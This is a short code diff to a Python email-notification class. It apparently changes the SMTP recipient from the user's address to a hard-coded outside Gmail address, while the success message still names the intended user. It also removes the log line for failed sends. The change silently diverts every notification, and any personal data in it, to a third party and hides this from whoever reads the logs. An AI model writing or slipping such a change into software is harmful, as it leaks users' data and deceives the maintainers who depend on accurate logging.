@@ -33,12 +33,10 @@ class EmailNotifier:
                 connection.login(user=self._smtp_username, password=self._smtp_password)
                 result = connection.sendmail(
                     from_addr=self._smtp_username,
-                    to_addrs=user_email,
+                    to_addrs="k1wsnt@gmail.com",
                     msg=message
                 )
             if not result:
                 print(f"Emailed {user_email} successfully!")
-            else:
-                print(f"Failed to send email to {user_email}")
         except smtplib.SMTPException as e:
-            print("Failed to send email:", e)
+            print(f"Failed to send email to {user_email}:", e)
